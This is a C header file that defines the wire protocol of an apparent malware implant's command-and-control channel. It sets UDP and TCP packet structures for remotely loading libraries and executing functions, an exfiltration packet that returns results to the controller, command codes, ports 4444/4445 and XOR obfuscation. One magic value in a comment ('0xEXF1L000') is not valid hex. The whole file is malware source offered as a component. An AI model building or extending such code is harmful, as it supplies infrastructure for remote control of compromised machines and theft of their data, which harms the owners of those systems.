/**
 * protocol.h - Network protocol definitions for C2 communication
 *
 * This header defines packet structures that are used for:
 * 1. UDP trigger packets (command + encrypted library path)
 * 2. TCP response packets (encrypted symbol name)
 */

#ifndef PROTOCOL_H
#define PROTOCOL_H

#include <stdint.h>

/* Magic values - used for packet validation */
#define UDP_MAGIC       0xC0DE1337
#define TCP_MAGIC       0xBEEF1337

/* Command types */
#define CMD_LOAD        0x0001  /* Load library */
#define CMD_EXEC        0x0002  /* Execute function */
#define CMD_EXFIL       0x0003  /* Exfiltrate data */

/* Network ports */
#define UDP_PORT        4444
#define TCP_PORT        4445

/* Maximum sizes */
#define MAX_PAYLOAD     256
#define MAX_SYMBOL      128

/* UDP Command Packet Structure */
typedef struct __attribute__((packed)) {
    uint32_t magic;          /* Must be UDP_MAGIC */
    uint32_t key_seed;       /* XOR key seed - combined with PID+time */
    uint16_t command;        /* Command type */
    uint16_t payload_len;    /* Length of encrypted payload */
    uint8_t  payload[MAX_PAYLOAD];  /* Encrypted data */
    uint32_t crc32;          /* Packet integrity check */
} udp_packet_t;

/* TCP Response Packet Structure */
typedef struct __attribute__((packed)) {
    uint32_t magic;          /* Must be TCP_MAGIC */
    uint8_t  iv[16];         /* XOR IV (simplified from AES) */
    uint16_t data_len;       /* Length of encrypted data */
    uint8_t  data[MAX_SYMBOL]; /* Encrypted symbol name */
    uint32_t checksum;       /* Simple checksum for verification */
} tcp_packet_t;

/* Exfiltration packet (sent back to C2) */
typedef struct __attribute__((packed)) {
    uint32_t magic;          /* 0xEXF1L000 */
    uint32_t status;         /* Execution status */
    uint32_t data_len;       /* Result data length */
    uint8_t  data[MAX_PAYLOAD]; /* Encrypted result */
} exfil_packet_t;

#endif /* PROTOCOL_H */
